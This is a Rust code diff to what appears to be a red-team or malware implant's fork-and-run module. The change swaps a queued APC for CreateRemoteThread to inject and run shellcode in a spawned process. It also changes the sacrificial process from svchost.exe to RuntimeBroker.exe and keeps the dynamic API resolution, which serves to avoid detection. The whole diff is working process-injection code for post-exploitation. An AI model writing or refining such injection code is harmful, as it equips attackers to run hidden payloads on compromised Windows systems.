@@ -33,7 +33,7 @@ pub struct ForkRunArgs {
     pub timeout: u32,
 }
 
-fn default_spawnto() -> String { "C:\\Windows\\System32\\svchost.exe".to_string() }
+fn default_spawnto() -> String { "C:\\Windows\\System32\\RuntimeBroker.exe".to_string() }
 fn default_timeout() -> u32 { 30 }
 
 fn download_file_chunks(
@@ -78,7 +78,7 @@ unsafe fn fork_and_run_impl(shellcode: &[u8], spawnto: &str, timeout_ms: u32) ->
     type VirtualAllocExFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, u32) -> *mut c_void;
     type WriteProcessMemoryFn = unsafe extern "system" fn(*mut c_void, *mut c_void, *const u8, usize, *mut usize) -> i32;
     type VirtualProtectExFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, *mut u32) -> i32;
-    type QueueUserAPCFn = unsafe extern "system" fn(Option<unsafe extern "system" fn(usize)>, *mut c_void, usize) -> u32;
+    type CreateRemoteThreadFn = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *mut c_void, u32, *mut u32) -> *mut c_void;
     type ResumeThreadFn = unsafe extern "system" fn(*mut c_void) -> u32;
     type ReadFileFn = unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *mut c_void) -> i32;
     type WaitForSingleObjectFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
@@ -126,7 +126,7 @@ unsafe fn fork_and_run_impl(shellcode: &[u8], spawnto: &str, timeout_ms: u32) ->
     let virtual_alloc_ex: VirtualAllocExFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "VirtualAllocEx").ok_or("VirtualAllocEx")?);
     let write_process_memory: WriteProcessMemoryFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "WriteProcessMemory").ok_or("WriteProcessMemory")?);
     let virtual_protect_ex: VirtualProtectExFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtectEx").ok_or("VirtualProtectEx")?);
-    let queue_user_apc: QueueUserAPCFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "QueueUserAPC").ok_or("QueueUserAPC")?);
+    let create_remote_thread: CreateRemoteThreadFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "CreateRemoteThread").ok_or("CreateRemoteThread")?);
     let resume_thread: ResumeThreadFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "ResumeThread").ok_or("ResumeThread")?);
     let read_file: ReadFileFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "ReadFile").ok_or("ReadFile")?);
     let wait_for_single_object: WaitForSingleObjectFn = std::mem::transmute(crate::winapi_resolve::resolve("kernel32.dll", "WaitForSingleObject").ok_or("WaitForSingleObject")?);
@@ -190,11 +190,29 @@ unsafe fn fork_and_run_impl(shellcode: &[u8], spawnto: &str, timeout_ms: u32) ->
     let mut old_protect: u32 = 0;
     virtual_protect_ex(pi.process, remote_mem, shellcode.len(), 0x20, &mut old_protect); // PAGE_EXECUTE_READ
 
-    // 4. Queue APC + close write pipe (parent side) + resume
-    queue_user_apc(Some(std::mem::transmute(remote_mem)), pi.thread, 0);
-    close_handle(write_pipe); // parent closes write end BEFORE resume — triggers EOF when child exits
+    // 4. Create remote thread in child to execute shellcode + close write pipe
+    let mut remote_tid: u32 = 0;
+    let remote_thread = create_remote_thread(
+        pi.process,
+        ptr::null_mut(),
+        0,
+        Some(std::mem::transmute(remote_mem)),
+        ptr::null_mut(),
+        0,
+        &mut remote_tid,
+    );
 
+    // Resume the main thread (needed for process to initialize)
     resume_thread(pi.thread);
+
+    // Close parent's write end of pipe — ReadFile will get EOF when child exits
+    close_handle(write_pipe);
+
+    if remote_thread.is_null() {
+        // Thread creation failed — still try to read any output
+    } else {
+        close_handle(remote_thread);
+    }
 
     // 5. Read stdout from pipe (blocks until child closes its end / dies)
     let mut output = Vec::new();
